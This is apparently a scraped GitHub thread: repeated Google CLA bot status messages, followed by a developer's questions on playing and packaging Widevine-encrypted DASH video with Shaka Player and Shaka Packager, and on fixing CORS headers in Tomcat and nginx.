project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address on your commit.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot. The email used to register you as an authorized contributor must be the email used for the Git commit.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address on your commit.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot. The email used to register you as an authorized contributor must be the email used for the Git commit.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address on your commit.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot. The email used to register you as an authorized contributor must be the email used for the Git commit.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. So there's good news and bad news.\n:thumbsup: The good news is that everyone that needs to sign a CLA (the pull request submitter and all commit authors) have done so.  Everything is all good there.\n:confused: The bad news is that it appears that one or more commits were authored by someone other than the pull request submitter.  We need to confirm that all authors are ok with their commits being contributed to this project.  Please have them confirm that here in the pull request.\nNote to project maintainer: This is a terminal state, meaning the cla/google commit status will not change from this State. It's up to you to confirm consent of the commit author(s) and merge this pull request when appropriate.\n need_author_consent \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. So there's good news and bad news.\n:thumbsup: The good news is that everyone that needs to sign a CLA (the pull request submitter and all commit authors) have done so.  Everything is all good there.\n:confused: The bad news is that it appears that one or more commits were authored by someone other than the pull request submitter.  We need to confirm that all authors are ok with their commits being contributed to this project.  Please have them confirm that here in the pull request.\nNote to project maintainer: This is a terminal state, meaning the cla/google commit status will not change from this state. It's up to you to confirm consent of the commit author(s) and merge this pull request when appropriate.\n need_author_consent \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for all the commit author(s) or Co-authors.  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again. If the bot doesn't comment, it means it doesn't think anything has changed.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n\u2139\ufe0f Googlers: Go here for more info.\n need_sender_cla \n. \nThanks for your pull request. It looks like this may be your first contribution to a Google open source project (if not, look below for help). Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed (or fixed any issues), please reply here (e.g. I signed it!) and we'll verify it.\n\nWhat to do if you already signed the CLA\nIndividual signers\n\nIt's possible we don't have your GitHub username or you're using a different email address on your commit. Check your existing CLA data and verify that your email is set on your git commits.\n\nCorporate signers\n\nYour company has a Point of Contact who decides which employees are authorized to participate. Ask your POC to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the Google project maintainer to go/cla#troubleshoot (Public version).\nThe email used to register you as an authorized contributor must be the email used for the Git commit. Check your existing CLA data and verify that your email is set on your git commits.\nThe email used to register you as an authorized contributor must also be attached to your GitHub account.\n\n\u2139\ufe0f Googlers: Go here for more info.\n need_sender_cla \n. CLAs look good, thanks!\n\u2139\ufe0f Googlers: Go here for more info.\n ok \n. CLAs look good, thanks!\n\u2139\ufe0f Googlers: Go here for more info.\n ok \n. ",
    "Pierpaolo1992": "Still problem, even if i'm using version 1.6.x. My code is the following:\n```html\n<!DOCTYPE html>\n\n\n\nTurtleTube - Basic Test\n Load the Shaka Player library. \n\n\n\n\n\n\n      Your browser does not support HTML5 video.\n    \n\n\n    function initPlayer() {\n      // Install polyfills.\n      shaka.polyfill.installAll();</p>\n<pre><code>  // Find the video element.\n  var video = document.getElementById('video');\n\n  // Construct a Player to wrap around it.\n  var player = new shaka.player.Player(video);\n\n  // Attach the player to the window so that it can be easily debugged.\n  window.player = player;\n\n  // Listen for errors from the Player.\n  player.addEventListener('error', function(event) {\n    console.error(event);\n  });\n\n  // Construct a DashVideoSource to represent the DASH manifest.\n  var mpdUrl = 'https://turtle-tube.appspot.com/t/t2/dash.mpd';\n  var estimator = new shaka.util.EWMABandwidthEstimator();\n  var source = new shaka.player.DashVideoSource(mpdUrl, null, estimator);\n\n  // Load the source into the Player.\n  player.load(source);\n}\ndocument.addEventListener('DOMContentLoaded', initPlayer);\n</code></pre>\n<p>\n\n```\n. Thanks for the response, @TheModMaker.\nI've another question:\nI'm trying to studying shaka-player and so also shaka-packager... in particular on demand-streaming of encrypted video, using DRM.\nIn particular, here i've seen this streaming of encrypted file (using Widevine CDM)\n```\n{\n name: 'Sintel 4k (multicodec, Widevine)',\n manifestUri: '//storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd', // gjslint: disable=110\nencoder: shakaAssets.Encoder.SHAKA_PACKAGER,\n source: shakaAssets.Source.SHAKA,\n drm: [shakaAssets.KeySystem.WIDEVINE],\n features: [\n shakaAssets.Feature.HIGH_DEFINITION,\n shakaAssets.Feature.MP4,\n shakaAssets.Feature.PSSH,\n shakaAssets.Feature.SEGMENT_BASE,\n shakaAssets.Feature.SUBTITLES,\n shakaAssets.Feature.ULTRA_HIGH_DEFINITION,\n shakaAssets.Feature.WEBM,\n shakaAssets.Feature.WEBVTT\n ],\nlicenseServers: {\n 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy'\n }\n },\n```\nand here:\n```\n{\n name: 'Tears of Steel (Widevine)',\n manifestUri: '//demo.unified-streaming.com/video/tears-of-steel/tears-of-steel-dash-widevine.ism/.mpd', // gjslint: disable=110\nencoder: shakaAssets.Encoder.UNIFIED_STREAMING,\n source: shakaAssets.Source.UNIFIED_STREAMING,\n drm: [\n shakaAssets.KeySystem.WIDEVINE\n ],\n features: [\n shakaAssets.Feature.EMBEDDED_TEXT,\n shakaAssets.Feature.HIGH_DEFINITION,\n shakaAssets.Feature.MP4,\n shakaAssets.Feature.SEGMENT_TEMPLATE_TIMELINE,\n shakaAssets.Feature.SUBTITLES,\n shakaAssets.Feature.TTML,\n shakaAssets.Feature.ULTRA_HIGH_DEFINITION\n ],\nlicenseServers: {\n 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy'\n }\n },\n```\nNow, my question is: how do exacly create this type of content? How could i exactly that .mpd, using that licenseServers?\nWhich flag could i use? What about KID and PSSH?\nSorry for my large number of questions!. Thanks for the answer, @TheModMaker. So if i use \n```\n--enable_widevine_encryption \\\n--key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" \\\n--content_id \"3031323334353637\" \\\n--signer \"widevine_test\" \\\n--aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" \\\n--aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\"\n--mpd_output example.mpd\n```\nWhich part of code that i have written before could i use in the javascript code?\nI mean something like: \n```\n{\n name: 'Tears of Steel (Widevine)',\n manifestUri: '/http://localhost/my/path/example.mpd', // gjslint: disable=110\nencoder: shakaAssets.Encoder.UNIFIED_STREAMING,\n source: shakaAssets.Source.UNIFIED_STREAMING,\n drm: [\n shakaAssets.KeySystem.WIDEVINE\n ],\n features: [\n shakaAssets.Feature.EMBEDDED_TEXT,\n shakaAssets.Feature.HIGH_DEFINITION,\n shakaAssets.Feature.MP4,\n shakaAssets.Feature.SEGMENT_TEMPLATE_TIMELINE,\n shakaAssets.Feature.SUBTITLES,\n shakaAssets.Feature.TTML,\n shakaAssets.Feature.ULTRA_HIGH_DEFINITION\n ],\nlicenseServers: {\n 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy'\n }\n },\n```\nIt should works, right?\n. Ok, i answer myself to my question above :)\nIts works!\nAnother question: i have an mp4 file (audio&video) and i would to segment and encrypt both track, and reproduce the entire file in an unique .mpd. How could i do?\nI've tried to do this:\nFirst:\n```\npackager input=file.mp4,stream=audio,output=file_audio.mp4 \\\n--profile on-demand \\\n--enable_widevine_encryption \\\n--key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" \\\n--content_id \"3031323334353637\" \\\n--signer \"widevine_test\" \\\n--aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" \\\n--aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\"\n--mpd_output example-audio.mpd\n```\nThen:\n```\npackager input=file.mp4,stream=video,output=file_video.mp4 \\\n--profile on-demand \\\n--enable_widevine_encryption \\\n--key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" \\\n--content_id \"3031323334353637\" \\\n--signer \"widevine_test\" \\\n--aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" \\\n--aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\"\n--mpd_output example-video.mpd\n```\nThen i think i should merge these two .mpd in terms of attaching <AdaptationSet tag one below each other. But, when i reproduce this (new) mpd with this:\n```\n{\n name: 'Sintel 4k (multicodec, Widevine)',\n manifestUri: '//storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd', // gjslint: disable=110\nencoder: shakaAssets.Encoder.SHAKA_PACKAGER,\n source: shakaAssets.Source.SHAKA,\n drm: [shakaAssets.KeySystem.WIDEVINE],\n features: [\n shakaAssets.Feature.HIGH_DEFINITION,\n shakaAssets.Feature.MP4,\n shakaAssets.Feature.PSSH,\n shakaAssets.Feature.SEGMENT_BASE,\n shakaAssets.Feature.SUBTITLES,\n shakaAssets.Feature.ULTRA_HIGH_DEFINITION,\n shakaAssets.Feature.WEBM,\n shakaAssets.Feature.WEBVTT\n ],\nlicenseServers: {\n 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy'\n }\n },\n```\nI only listen audio, not see video.\nHow could i do? @TheModMaker \nThanks again!\nI attach my \"new\" mpd (insert as .txt instead of .mpd)\nexample-audio-video.txt\nOk, solved. I should segment&encrypt both tracks with one command:\npackager input=LynyrdSkynyrdFreebird.mp4,stream=audio,output=LynyrdSkynyrdFreebirdAudio.mp4 input=LynyrdSkynyrdFreebird.mp4,stream=video,output=LynyrdSkynyrdFreebirdVideo.mp4   --profile on-demand --enable_widevine_encryption --key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" --content_id \"3031323334353637\" --signer \"widevine_test\" --aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" --aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\" --mpd_output example-av.mpd\n. Thanks for your answer, @joeyparrish. So, can i could solde this problem?. Thanks, @joeyparrish. So do i have to configure tomcat backend for adding the following HTTP response header?                                                                                                                                    \nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: If-Modified-Since, Range, Origin\nHow could i insert these header in HTTP response in tomcat container? Based on official docker tomcat image.. Thanks for your support, @joeyparrish \n. @johanhil i've solved in the following way: in the mpd, in the <URL tag (Lynyrd..mp4) i've wrote 172.17.0.1:9000/Lynyrd...Audio/Video.mp4. In the nginx conf file, i've added two location = /Lynyrd...Audio/Video.mp4 with inside add_header 'Access-Control-Allow-Origin' '*' and Access-Control-Add-Headers 'Range'. And now it works.. I've tried with chrome v.55 and firefox. Reading stackoverflow thread, w3 has updated his standard about CORS in August 2016, but browser vendors require time to implement this new standard.\nI resolved this problem using google chrome canary browser.. Yes, redirect after preflight request works with canary (v.58). Great! I appreciated i've cotributed to something's new, for you, about cors redirect. \nI hope i've given you some help!. @joeyparrish cors redirect doesn't working on Firefox Developed Edition, v.53.0a2 (2017-02-1) (64bit).\nI've read that you have write here that it works in \"WebKit nightly r211339\". Where can i download this webkit from? Thanks!. Are WebKit nightly builds available also for Ubuntu? I'd like testing my architecture on a Firefox distro.. @joeyparrish is there some firefox release that supports this cors-redirect? I.e. nightly?. I've saw here (in uncompiled mode section) and here: this is my code:\n```\nhtml\n\n\n\nTurtleTube - Basic Test\n Load the Shaka Player library. \n\n\n\n\n\n\n      Your browser does not support HTML5 video.\n    \n\n\n    function initPlayer() {\n      // Install polyfills.\n      shaka.polyfill.installAll();\n\n<pre><code>  // Find the video element.\n  var video = document.getElementById('video');\n\n  // Construct a Player to wrap around it.\n  var player = new 